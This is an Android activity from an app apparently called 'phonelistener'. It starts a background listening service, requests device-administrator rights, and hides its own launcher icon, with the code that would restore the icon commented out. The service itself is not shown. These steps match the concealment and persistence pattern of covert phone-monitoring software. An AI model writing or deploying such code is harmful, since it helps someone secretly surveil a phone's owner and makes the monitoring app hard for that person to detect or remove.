package com.wpl.phonelistener.activity;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.view.View;

import com.wpl.phonelistener.R;
import com.wpl.phonelistener.base.BaseActivity;
import com.wpl.phonelistener.broadcast.MyDeviceAdmin;
import com.wpl.phonelistener.service.MyService;
import com.wpl.phonelistener.utils.PhoneUtils;

import butterknife.OnClick;

public class MainActivity extends BaseActivity {

    private PhoneUtils phoneUtils;
    private Intent intentService;

    @Override
    protected int initLayoutId() {
        return R.layout.activity_main;
    }

    @Override
    protected void initView() {
        phoneUtils = new PhoneUtils(this);
        intentService = new Intent(this, MyService.class);
    }

    @OnClick({R.id.startService, R.id.stopService, R.id.deviceManager, R.id.hiddenApp})
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.startService:
                if (!phoneUtils.isServiceRunning(MyService.class.getName())) {
                    startService(intentService);
                } else {
                    ToastShow("服务正在运行中...");
                }
                break;
            case R.id.stopService:
                if (phoneUtils.isServiceRunning(MyService.class.getName())) {
                    stopService(intentService);
                } else {
                    ToastShow("服务已停止");
                }
                break;
            case R.id.deviceManager:
                initDevice();
                break;
            case R.id.hiddenApp:
                initHidden();
                break;
            default:
                break;
        }
    }

    /**
     * 隐藏APP
     */
    private void initHidden() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this,
                MainActivity.class);
        int res = packageManager.getComponentEnabledSetting(componentName);
        if (res == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT
                || res == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
            // 隐藏应用图标
            packageManager.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        } else {
            // 显示应用图标
            // packageManager.setComponentEnabledSetting(componentName,
            // PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
            // PackageManager.DONT_KILL_APP);
        }
    }

    /**
     * 申请设备管理器权限
     */
    private void initDevice() {
        // 申请权限
        ComponentName componentName = new ComponentName(this, MyDeviceAdmin.class);
        // 设备安全管理服务 2.2之前的版本是没有对外暴露的 只能通过反射技术获取
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        // 判断该组件是否有系统管理员的权限
        boolean isAdminActive = devicePolicyManager.isAdminActive(componentName);
        if (!isAdminActive) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "测试");
            startActivityForResult(intent, 20);
        }
    }
}
